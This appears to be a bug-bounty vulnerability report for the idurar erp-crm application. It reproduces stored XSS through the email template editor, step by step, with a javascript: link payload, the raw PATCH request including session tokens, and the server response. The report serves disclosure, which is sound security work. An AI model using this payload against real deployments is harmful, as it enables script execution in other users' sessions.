# Description
It was observed to be able to preform stored XSS via the edit email template functionality. 

 # Proof of Concept
1. Download and run the application locally with instructions from the repo https://github.com/idurar/erp-crm/tree/master#getting-started
2. Log in to the app and navigate to http://localhost:3000/email
3. Modify an email template, and proxy the traffic through burp. Send the request to repeater
4. Modify the request body to match the below 
```
{"emailSubject":"Password Reset  From Idurar","emailBody":"<p>email_reset_password_default</p><p><br></p><p><a href=javascript:alert(1)>xss</a></p>"}
```
5. Send the request and you should see the following response:
```
{"success":true,"result":{"_id":"651c9f1bad0b562caa0f1166","emailKey":"email_reset_password_default","emailName":"Password Reset Email","emailVariables":["name"],"emailBody":"<p>email_reset_password_default</p><p><br></p><p><a href=javascript:alert(1)>xss</a></p>","emailSubject":"Password Reset  From Idurar","language":"en","removed":false,"enabled":true,"created":"2023-10-03T23:09:15.552Z","updated":"2023-10-03T23:09:15.552Z","__v":0},"message":"we update this document by this id: 651c9f1bad0b562caa0f1166"}
```
6. Navigate to http://localhost:3000/email/read/651c9f1bad0b562caa0f1166 (651c9f1bad0b562caa0f1166 being the id of the email template)
7. Xss triggers when clicking on the link


![alt text](https://github.com/wbowm15/jubilant-enigma/blob/main/xss%20payload.png?raw=true "Logo Title Text 1")

![alt text](https://github.com/wbowm15/jubilant-enigma/blob/main/xss%20triggered.png?raw=true "Logo Title Text 1")


## POC Request
```Request:
PATCH /api/email/update/651c9f1bad0b562caa0f1166 HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost:3000/
Content-Type: application/json
Content-Length: 149
Origin: http://localhost:3000
Connection: close
Cookie: _xsrf=2|1c005387|4ee8a1afa66476bc93df90a6262a0feb|1696374989; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY1MWM5ZjFhYWQwYjU2MmNhYTBmMTEzYyIsImlhdCI6MTY5NjM3NjQ3NCwiZXhwIjoxNzI3OTEyNDc0fQ.l28clN7Zs3c8y0mnQShfqjIfHUEg_JJGZQfQSJCC-oI
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site

{"emailSubject":"Password Reset  From Idurar","emailBody":"<p>email_reset_password_default</p><p><br></p><p><a href=javascript:alert(1)>xss</a></p>"}
```
